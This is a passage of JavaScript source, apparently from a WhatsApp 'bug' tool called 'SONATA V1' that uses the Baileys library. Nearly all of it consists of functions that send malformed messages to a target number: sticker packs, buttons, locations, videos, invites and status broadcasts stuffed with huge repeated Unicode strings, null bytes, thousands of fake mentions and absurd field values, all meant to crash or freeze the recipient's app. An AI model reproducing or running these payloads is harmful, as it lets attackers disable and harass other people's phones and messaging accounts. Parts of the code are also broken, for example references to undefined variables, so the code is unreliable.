        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 } }
        }
      }
    };

    await sock.relayMessage("status@broadcast", stickerMsg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }]
      }]
    });

    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body: { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: "\u0000".repeat(100000) },
        contextInfo: {
          mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 3000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
          entryPointConversionSource: "galaxy_message"
        }
      }
    }, {});

    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target }, messageId: msg.key.id });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }]
      }]
    });
  } catch (err) {
    console.log(err.message);
  }
}

async function exeTrash(sock, target) {
  try {
    const exeTrashStr = "ꦾ".repeat(500000);
    const buttons = [];
    for (let b = 0; b < 2000; b++) {
      buttons.push({
        buttonId: 'btn_' + "\x10".repeat(100000),
        buttonText: { displayText: exeTrashStr.substring(0, 5000) },
        type: 1
      });
    }

    await sock.relayMessage(target, {
      buttonsMessage: {
        contentText: "# 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭" + exeTrashStr.substring(0, 60000),
        footerText: exeTrashStr.substring(0, 60000),
        buttons: buttons,
        headerType: 1,
        viewOnce: true
      }
    }, { messageId: null }).catch(() => {});
  } catch (e) {
    console.log(`error: ${e.message}`);
  }
}

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 8/15");
console.log("    STATUS : BUG WA BATCH 3 OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

// ═══════════════════════════════════════════════════════════════════════
//  Part 9/15: FUNGSI BUG WA — BATCH 4
// ═══════════════════════════════════════════════════════════════════════

async function PayLink(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: " ./R4LDZ EXE",
          previewType: 6,
          contextInfo: { mentionedJid: Array.from({ length: 100 }, (_, z) => `628${z + 1}@s.whatsapp.net`) },
          paymentLinkMetadata: {
            button: { displayText: "Bro?" },
            header: { headerType: 2 },
            provider: { paramsJson: "{".repeat(10000) }
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { participant: { jid: target } });
}

async function lockGB(sock, target) {
  sock.relayMessage(target, {
    locationMessage: {
      degreesLatitude: 1010101,
      degreesLongitude: 1010101,
      name: "funny loc ¿? " + "ꦽ".repeat(60000),
      address: ".sevrin444 ( @rraldz )",
      url: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/" + "ꦽ".repeat(60000),
      clickToWhatsappCall: true,
      contextInfo: {
        businessMessageForwardInfo: { businessOwnerJid: target },
        mentionedJid: [target, "13135550002@s.whatsapp.net"]
      }
    }
  }, {});
}

async function iOSExe(sock, target) {
  await sock.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "X",
      name: "./hyuuXxsad" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
      publisher: "./hyuuXxBukanDep" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
      stickers: [
        { fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp", isAnimated: false, emojis: ["🀄"], accessibilityLabel: "woi", isLottie: true, mimetype: "application/pdf" },
        { fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp", isAnimated: false, emojis: ["🀄"], accessibilityLabel: "pppp", isLottie: true, mimetype: "application/pdf" },
        { fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp", isAnimated: false, emojis: ["🀄"], accessibilityLabel: "maklo", isLottie: true, mimetype: "application/pdf" },
        { fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp", isAnimated: false, emojis: ["🀄"], accessibilityLabel: "pp", isLottie: true, mimetype: "application/pdf" },
        { fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp", isAnimated: false, emojis: ["🀄"], accessibilityLabel: "ppp", isLottie: true, mimetype: "application/pdf" },
        { fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp", isAnimated: false, emojis: ["🀄"], accessibilityLabel: "ppp", isLottie: true, mimetype: "application/pdf" },
        { fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp", isAnimated: false, emojis: ["🀄"], accessibilityLabel: "pppp", isLottie: true, mimetype: "application/pdf" },
        { fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp", isAnimated: false, emojis: ["🀄"], accessibilityLabel: "ppp", isLottie: true, mimetype: "application/pdf" },
        { fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp", isAnimated: false, emojis: ["🀄"], accessibilityLabel: "pppp", isLottie: true, mimetype: "application/pdf" },
        { fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp", isAnimated: false, emojis: ["🀄"], accessibilityLabel: "pppp", isLottie: true, mimetype: "application/pdf" }
      ],
      fileLength: "999999",
      fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
      fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
      mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
      directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
      contextInfo: {
        quotedMessage: {
          paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 },
          forwardedAiBotMessageInfo: { botName: "META AI", botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net", creatorName: "Bot" }
        }
      },
      packDescription: "./diki" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
      mediaKeyTimestamp: "1741150286",
      trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
      thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
      thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
      thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
      stickerPackSize: "999999999",
      stickerPackOrigin: "1"
    }
  }, { participant: { jid: target } });
}


async function IMGFRZ(sock, target) {
  await sock.relayMessage(target, {
    videoMessage: {
      caption: "⟨〽⃟💛✩ ᜴𝐕࿆𝐬𝐏࿆ꢵ ✩💛⃟〽⟩" + "ꦽ".repeat(65000),
      url: "https://mmg.whatsapp.net/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "xx78ONox8l/eqf3pYnJcMwiBCse3FVLKkk9jdfP5oPI=",
      fileLength: "9999999999999999e+9999999",
      seconds: 999999999,
      mediaKey: "LIHnYC8TN+vB3X9ed+nbu04NRdJ5PCmnHLXwu26o7RE=",
      height: 999999999999,
      width: -999999999999,
      fileEncSha256: "6a5lF9qeH/js+wV8W9fsrgVlXTSCd5htFyLKOCqzoHc=",
      directPath: "/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1772045071",
      jpegThumbnail: Buffer.alloc(0),
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        statusSourceType: "IMAGE",
        isForwarded: true,
        forwardingScore: 9999,
        remoteJid: "VsP`Team",
        externalAdReply: {
          title: "🦋⃰͡°͜͡⃟⿻ 𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸 " + "ꦽ".repeat(60000),
          body: "ꦽ".repeat(60000),
          mediaType: "VIDEO",
          renderLargerThumbnail: true,
          containsAutoReply: true,
          showAdAttribution: true,
          thumbnail: { url: "https://files.catbox.moe/0iq0n3.jpg" },
          sourceUrl: `https://${"ꦽ".repeat(60000)}.wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/`
        },
        businessMessageForwardInfo: { businessOwnerJid: "13135559999@s.whatsapp.net", businessDescrbiption: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 " },
        mentions: target,
        groupMentions: Array.from({ length: 1900 }, () => ({ groupJid: `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`, groupSubject: "X" })),
        quotedMessage: {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: { text: "Sent", format: "DEFAULT" },
                nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "{", version: 3 }
              }
            }
          }
        },
        statusAttributions: [
          { type: "MUSIC", music: { authorName: "ꦽ".repeat(9999), songId: "243234016584833", title: "Baon Cikadap" + "ꦽ".repeat(9999), author: "𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸" + "ꦽ".repeat(9999), artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/", isExplicit: false } },
          { type: "GROUP_STATUS", music: { authorName: "ꦽ".repeat(9999), songId: "243234016584836", title: "Baon Cikadap" + "ꦽ".repeat(9999), author: "𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸" + "ꦽ".repeat(9999), artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/", isExplicit: false } }
        ]
      },
      streamingSidecar: "/PFxy0I/BUf8vbt/pW0sJ2j35YorqVHaII+thZ6V7yBUnox3c4QatbRETk7b2zb3nlQ=",
      thumbnailDirectPath: "/v/t62.36147-24/593729676_1666419884645510_6285328431371507107_n.enc?ccb=11-4&oh=01_Q5Aa3wE2rCOu-EHBRz-yTOwRKjTlNItBVyfvepZpPpsmtDULhw&oe=69C69DFE&_nc_sid=5e03e0",
      thumbnailSha256: "Cjw/0a5/5hzXKuDb6Rku26kazUYCZo0pyK8Xz35ecmo=",
      thumbnailEncSha256: "DNT9rfoBh/sCwpuOIr27W/9DwsUjP/BhZjpy3iPqFG0=",
      annotations: [{
        location: { degreesLongitude: 0, degreesLatitude: 0, name: "#Vault•¿🎭?•(Superior)" },
        polygonVertices: [
          { x: 999999999999999999, y: -999999999999999999 },
          { x: 999999999999999999, y: -999999999999999999 },
          { x: 999999999999999999, y: -999999999999999999 },
          { x: 999999999999999999, y: -999999999999999999 }
        ],
        shouldSkipConfirmation: true,
        embeddedContent: {
          embeddedMusic: {
            musicContentMediaId: "34028249360153165",
            songId: "243234016584833",
            title: "Baon Cikadap" + "ꦽ".repeat(9999),
            author: "𖥞 DENIS NI BANG 𒀸" + "ꦽ".repeat(9999),
            artworkDirectPath: "/v/t62.76458-24/33007276_830604333385904_5311398360527691061_n.enc?ccb=11-4&oh=01_Q5Aa3wH56VfaFfiQnInWSCwFZPy-UZPFQtqD1IGRFYWJIs_Tjg&oe=69C6BA9E&_nc_sid=5e03e0",
            artworkSha256: "ea9OLJCdRGuahQJyYKqrvHkaQg01CYjJkCEjCid2kRg=",
            artworkEncSha256: "Av+nl2omDopYfspLMfiR7w9+DiynCncYllNpze9z8PQ=",
            artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
            countryBlocklist: "",
            isExplicit: false,
            artworkMediaKey: "eSQ0o4UHYhwmUuEcGXesztrXm/tlTvDRBwoTF8dgVNA=",
            musicSongStartTimeInMs: "999999999",
            derivedContentStartTimeInMs: "999999999",
            overlapDurationInMs: "999999999"
          }
        },
        embeddedAction: true
      }]
    }
  }, { participant: { jid: target } });
}

async function blankGroup(client, target) {
  await client.relayMessage(target, {
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "1@newsletter",
          newsletterName: "ꦽ".repeat(60000),
          jpegThumbnail: "",
          caption: "ꦽ".repeat(60000),
          inviteExpiration: Date.now() * 999e+21
        }
      }
    },
    nativeFlowMessage: { messageParamsJson: "{}", buttons: [{ name: "call_permission_request", buttonParamsJson: "" }] },
    contextInfo: { mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
  }, {});

  await client.relayMessage(target, {
    extendedTextMessage: {
      text: "⤻꙳͙͡༑ORCA BERSINAR😂" + "ꦽ".repeat(120000),
      contextInfo: {
        quotedMessage: {
          groupInviteMessage: {
            groupJid: "888-62888@g.us",
            inviteCode: "Xx".repeat(100000),
            inviteExpiration: 999e+999 * Date.now(),
            groupName: "ꦽ".repeat(60000),
            caption: "ꦽ".repeat(60000),
            jpegThumbnail: ""
          }
        },
        mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)]
      }
    }
  }, {});
}

async function packBlank(sock, target) {
  console.log(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`);
  await sock.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "X",
      name: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
      publisher: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
      stickers: [
        { fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp", isAnimated: false, emojis: ["😮‍💨"], accessibilityLabel: "otax", isLottie: true, mimetype: "application/pdf" },
        { fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp", isAnimated: false, emojis: ["😮‍💨"], accessibilityLabel: "otax", isLottie: true, mimetype: "application/pdf" },
        { fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp", isAnimated: false, emojis: ["😮‍💨"], accessibilityLabel: "otax", isLottie: true, mimetype: "application/pdf" },
        { fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp", isAnimated: false, emojis: ["😮‍💨"], accessibilityLabel: "otax", isLottie: true, mimetype: "application/pdf" },
        { fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp", isAnimated: false, emojis: ["😮‍💨"], accessibilityLabel: "otax", isLottie: true, mimetype: "application/pdf" },
        { fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp", isAnimated: false, emojis: ["😮‍💨"], accessibilityLabel: "otax", isLottie: true, mimetype: "application/pdf" },
        { fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp", isAnimated: false, emojis: ["😮‍💨"], accessibilityLabel: "otax", isLottie: true, mimetype: "application/pdf" },
        { fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp", isAnimated: false, emojis: ["😮‍💨"], accessibilityLabel: "otax", isLottie: true, mimetype: "application/pdf" },
        { fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp", isAnimated: false, emojis: ["😮‍💨"], accessibilityLabel: "otax", isLottie: true, mimetype: "application/pdf" },
        { fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp", isAnimated: false, emojis: ["😮‍💨"], accessibilityLabel: "otax", isLottie: true, mimetype: "application/pdf" }
      ],
      fileLength: "9999999999999",
      fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
      fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
      mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
      directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
      contextInfo: { quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 }, forwardedAiBotMessageInfo: { botName: "META AI", botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net", creatorName: "Bot" } } },
      packDescription: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
      mediaKeyTimestamp: "1741150286",
      trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
      thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
      thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
      thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
      stickerPackSize: "999999999",
      stickerPackOrigin: "1"
    }
  }, { participant: { jid: target } });
}

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 9/15");
console.log("    STATUS : BUG WA BATCH 4 OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
// ═══════════════════════════════════════════════════════════════════════
//  Part 10/15: BUG WA BATCH 5 + WA CONNECT + BanGbNew
// ═══════════════════════════════════════════════════════════════════════

async function AyunBelovedxnxxahyaa(sock, target) {
  console.log('𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴');
  const { nodes } = await sock.emit('getNodes');

  const message = {
    extendedTextMessage: {
      text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(50000) + "\n\nJust OTAX" + "\0".repeat(100),
      matchedText: "https://t.me/Otapengenkawin",
      description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
      title: "ꦽ".repeat(20000),
      previewType: 6,
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
      paymentLinkMetadata: { button: { displayText: "Love U My Ayun" }, header: { headerType: 1 }, provider: { paramsJson: "{".repeat(10000) } },
      contextInfo: {
        isForwarded: true, forwardingScore: 9999, participant: target, remoteJid: "status@broadcast",
        mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)],
        quotedMessage: { newsletterAdminInviteMessage: { newsletterJid: "otax@newsletter", newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000), caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000), inviteExpiration: "999999999" } },
        forwardedNewsletterMessageInfo: { newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000), newsletterJid: "13135550002@newsletter", serverId: 1 }
      }
    }
  };

  const fullMsgNode = await sock.generateWAMessage(target, message, { userJid: sock.user.id });

  const Stanza = {
    tag: "message",
    id: sock.generateMessageID(),
    type: "text",
    to: target,
    additionalAttributes: {},
    content: [
      { tag: "enc", attrs: { v: "2", type: "none" }, content: [] },
      { tag: "participants", atts: {}, content: nodes }
    ]
  };

  await sock.sendNode(Stanza);
  await sleep(1000);
  await sock.sendMessage(target, { delete: { remoteJid: target, fromMe: true, id: fullMsgAttrs.id, participant: target } });
  console.log("Delay Visib Success To " + target);
}

async function inviteUI(sock, target) {
  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: "DENIS SUKA MMK" + "ꦽ".repeat(50000),
      previewType: "NONE",
      contextInfo: { mentionedJid: [target] },
      inviteLinkGroupTypeV2: "DEFAULT"
    }
  }, { participant: { jid: target } });
}

async function forceout(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(target, {
      botInvokeMessage: {
        message: {
          messageContextInfo: { messageSecret: crypto.randomBytes(16), deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveResponseMessage: {
            contextInfo: {
              paticipant: target, remoteJid: "0@s.whatsappp.net", isForwarded: true, forwardingScore: 9999,
              mentionedJid: Array.from({ length: 1000 }, (_, r4) => `628${666 + r4}@s.whatsapp.net`),
              fromMe: true,
              forwardedAiBotMessageInfo: { botJid: "13135550202@bot", botName: "Meta AI", creator: "Meta" },
              statusAttributionType: 2,
              statusAttributions: Array.from({ length: 200900 }, () => ({ type: 1 }))
            },
            body: { text: "X", format: "DEFAULT" },
            nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "\u0000".repeat(15000), version: 3 }
          }
        }
      }
    }, { userJid: target });

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id, statusJidList: [target],
      additionalNodes: [{ tag: "meta", attrs: { status_setting: "contacts" }, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
    });
  } catch (err) { console.error(err); }
}

async function ofmEr(sock, target) {
  await sock.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: { messageSecret: crypto.randomBytes(32), deviceListMetadata: { senderKeyIndex: 0, senderTimestamp: Date.now(), recipientKeyIndex: 0 }, deviceListMetadataVersion: 2 },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "status@broadcast", fromMe: true,
            forwardedAiBotMessageInfo: { botJid: "13135550202@bot", botName: "Business Assistant", creator: "XzC - Expos3d" },
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 1000000 }, (_, z) => ({ participant: `62${z + 720599}@s.whatsapp.net`, type: 1 })),
            participant: sock.user.id
          },
          body: { text: "7eppeli.pdf", format: "DEFAULT" },
          nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "{ X: { status:true } }", version: 3 }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{ tag: "meta", attrs: { status_setting: "contacts" }, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: [] }] }] }]
  });
}

async function inTers6(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast", {
      interactiveResponseMessage: {
        body: { text: "\x10t.me/RaldzzXyz", format: "DEFAULT" },
        nativeFlowResponseMessage: { name: "address_message", paramsJson: "{", version: 3 },
        contextInfo: { remoteJid: " @RaldzzXyz $$$ @voidp $$ @rraldz ", urlTrackingMap: { urlTrackingMapElements: Array.from({ length: 900000 }, () => ({ type: 1 })) } }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [{ tag: "meta", attrs: { status_setting: "allowlist" }, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: [] }] }] }]
    });
  }
  await sleep(1000);
}

async function OnlyQuotaZ(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(target, {
      interactiveMessage: {
        header: {
          hasMediaAttachment: true,
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356713_n.enc?ccb=11-4",
            mimetype: "video/mp4",
            fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
            fileLength: "289511", seconds: 9999,
            mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
            caption: "X", height: 9999, width: 620,
            fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
            directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356713_n.enc",
            mediaKeyTimestamp: "1755695348"
          }
        },
        body: { text: "!" },
        contextInfo: { mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")] },
        nativeFlowMessage: { buttons: [{ name: "galaxy_message", paramsJson: "\u0000".repeat(3000) }] }
      }
    }, {});

    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target }, messageId: msg.key.id });
  } catch (err) {
    console.log(`SUCCESS SEND BUG: ${target}`);
  }
}

const { generateMessageIDV2, encodeSignedDeviceIdentity, jidEncode } = require("@whiskeysockets/baileys");

const relayMSGCustom = async (sock, target, message) => {
  const authVsP = sock.authState.creds.me.id;
  const meLid = sock.authState.creds.me?.lid;
  const { user: mePN } = jidDecode(authVsP);
  const { user: meLidU } = meLid ? jidDecode(meLid) : { user: null };

  const msgId = generateMessageIDV2(authVsP);
  const ngentodd = jidEncode(jidDecode(meLid)?.user, "lid", undefined);

  const meMsg = { deviceSentMessage: { destinationJid: target, message }, messageContextInfo: message.messageContextInfo };
  const VsP = {};
  const mediaTypeVsP = message.imageMessage ? "image" : message.videoMessage ? message.videoMessage.gifPlayback ? "gif" : "video" : message.audioMessage ? message.audioMessage.ptt ? "ptt" : "audio" : message.documentMessage ? "document" : message.stickerMessage ? "sticker" : undefined;
  if (mediaTypeVsP) VsP.mediatype = mediaTypeVsP;

  let stanza;
  await sock.authState.keys.transaction(async () => {
    const devices = await sock.getUSyncDevices([ngentodd, target], true, false);
    const meR = [], otR = [];
    for (const { user, jid: dJid } of devices) {
      if (dJid === authVsP || (meLid && dJid === meLid)) continue;
      const isMe = user === mePN || user === meLidU;
      (isMe ? meR : otR).push(dJid);
    }
    const all = [...meR, ...otR];
    await sock.assertSessions(all);
    const [{ nodes: meN }, { nodes: otN }] = await Promise.all([
      sock.createParticipantNodes(meR, { conversation: "⟨〽⃟💛✩ ᜴𝐕࿆𝐬𝐏࿆ꢵ ✩💛⃟〽⟩" }),
      sock.createParticipantNodes(otR, message, VsP, meMsg)
    ]);
    stanza = { tag: "message", attrs: { id: msgId, to: target, type: "text" }, content: [...meN, ...otN].length ? [{ tag: "participants", attrs: {}, content: [...meN, ...otN] }] : [] };
    await sock.sendNode(stanza);
